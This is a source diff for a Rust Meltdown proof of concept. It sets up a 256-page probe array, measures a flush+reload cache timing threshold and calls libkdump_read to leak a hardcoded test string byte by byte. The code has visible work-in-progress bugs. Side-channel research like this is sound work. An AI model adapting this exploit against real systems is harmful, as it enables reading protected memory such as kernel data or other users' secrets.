@@ -6,16 +6,12 @@ extern crate alloc;
 use runtime::*;
 use terminal::{print, println};
 use alloc::vec::Vec;
-use alloc::vec;
-use spin::Mutex;
 
 use core::arch::asm;
 
 #[derive(Copy, Clone)] // Required to initialize an entire array with such objects
 #[allow(dead_code)]
-pub struct MemoryPage([u8; 1]);
-
-const ARRAY_SIZE: usize = 1; // 256 entries, each containing 256 u128's, meaning 256*4K
+pub struct MemoryPage([u128; 256]);
 
 pub struct Config {
 	measurements: u32,
@@ -125,7 +121,7 @@ pub fn detect_flush_reload_threshold() -> u64{
     let mut reload_time: u64 = 0;
     let mut flush_reload_time: u64 = 0;
     let count: u64 = 10000000;
-    let dummy = MemoryPage([0; 1]); // TODO Use single value instead of array ok?
+    let dummy = MemoryPage([0; 256]); // TODO Use single value instead of array ok?
     let pointer: *const MemoryPage;
     let mut start_time: u64;
     let mut end_time: u64;
@@ -160,7 +156,7 @@ pub fn detect_flush_reload_threshold() -> u64{
 #[unsafe(no_mangle)]
 pub fn main() {
     println!("Meltdown start\n");
-    let mem = MemoryPage([0; 1]);
+    const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K
     const SECRET: &str = "Whoever reads this is dumb.";
     let default_config = Config {
 		measurements: 3,
@@ -171,8 +167,17 @@ pub fn main() {
     println!("Current CPU time: {}", rdtsc());
     let cache_miss_threshold = detect_flush_reload_threshold();
     
+	let mut mem: Vec<MemoryPage> = Vec::with_capacity(ARRAY_SIZE); // TODO: Is this really continuus memory without gaps / metadata, or is it a linked list or something?
+	mem.fill(MemoryPage([0; 256]));
+    
+    for i in 0..ARRAY_SIZE {
+        flush(&mem[i] as *const MemoryPage);
+    }
+    
     let mut index: usize = 0;
     while index < SECRET.len() {
+		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, SECRET[index..index].as_ptr());
+		println!("Got value: {}", value);
 		index += 1;
 	}
 }
